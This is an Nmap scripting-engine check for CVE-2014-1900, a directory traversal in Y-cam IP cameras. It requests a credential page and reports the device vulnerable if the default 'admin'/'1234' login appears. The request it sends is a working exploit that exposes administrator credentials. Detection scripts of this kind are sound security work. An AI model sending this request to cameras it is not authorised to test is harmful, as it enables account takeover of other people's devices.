local http = require "http"
local string = require "string"
local stdnse = require "stdnse"
local shortport = require "shortport"

author = "seaung"

license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"cam_directorytraveral_03"}

description = [[
CVE:CVE-2014-1900
Desc:Y-cam存在目录遍历漏洞，未授权攻击者可以通过目录遍历来绕过认证，
并获得管理员的凭证，访问/./en/account/accedit.asp?item=0即可查看管理
员凭证
Affected:YCB001, YCW001,YCB002, YCK002, YCW003
]]

portrule = shortport.port_or_service( {80, 443}, {"http", "https"}, "tcp", "open")

action = function(host, port)
	local output = stdnse.output_table()
	local path = "/./en/account/accedit.asp?item=0"
	local check_admin_txt = "admin"
	local check_admin_pwd = "1234"

	local r = http.get(host, port, path)

	if r.status == 200 then
		if string.find(r.body, check_admin_txt) ~= nil and string.find(r.body, check_admin_pwd) ~= nil then
			output = "Found Vulnerable"
		else
			output = "Not Vulnerable"
		end
	else
		output = "Not Vulnerable"
	end
	return output
end

